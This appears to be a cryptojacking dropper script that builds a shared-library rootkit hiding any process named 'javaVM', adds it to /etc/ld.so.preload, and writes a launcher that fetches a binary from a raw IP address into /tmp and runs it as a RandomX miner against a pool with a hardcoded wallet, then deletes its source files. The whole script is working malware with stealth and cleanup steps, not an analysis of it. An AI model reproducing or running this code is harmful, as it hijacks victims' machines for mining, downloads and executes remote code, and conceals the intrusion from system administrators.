cat > combined_script.sh << 'EOL'
#!/bin/bash

# Installation commands
apt update
apt -y install nano wget htop binutils cmake build-essential screen unzip net-tools curl

unset LD_PRELOAD
unset LD_LIBRARY_PATH
export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin'

sleep 0.5

# Process hiding C code
cat > processhider.c << 'EOL1'
#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "javaVM";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
                strcmp(process_name, process_to_filter) == 0) {         \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
EOL1

sleep 0.2

# Makefile for compiling the C code
cat > Makefile << 'EOL2'
all: libprocesshider.so

libprocesshider.so: processhider.c
	gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl

.PHONY: clean
clean:
	rm -f libprocesshider.so
EOL2

sleep 0.5

# Compile the C code
make

# Move the compiled library to the appropriate location
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo "/usr/local/lib/libprocesshider.so" >> /etc/ld.so.preload

sleep 0.3

# Script to start javaVM
cat > start_javaVM.sh << 'EOL3'
#!/bin/sh
if [ -f /tmp/javaVM ]
then
    /tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu > /dev/null 2>&1 &
    echo "Started Existing"
else
    wget -q http://150.136.168.71:80/archxx/SMULTI24 -O /tmp/javaVM
    chmod +x /tmp/javaVM
    /tmp/javaVM --algorithm randomx --pool 103.228.74.80:4444 --wallet ZEPHs9EoDAxbWgcA8eLM6xVPpcKt5vMZz47KN29LaYRZVKhuowDdsM22n2ExnU3A7BiS3CxzXCuruRBofjuwvoP9FSRyXzzWWSt --password duckz --cpu-threads 1 --disable-gpu > /dev/null 2>&1 &
fi
EOL3

chmod +x start_javaVM.sh

# Cleanup unnecessary files
rm -f processhider.c Makefile

# End of script
EOL

chmod +x combined_script.sh

echo "Combined script 'combined_script.sh' created successfully."
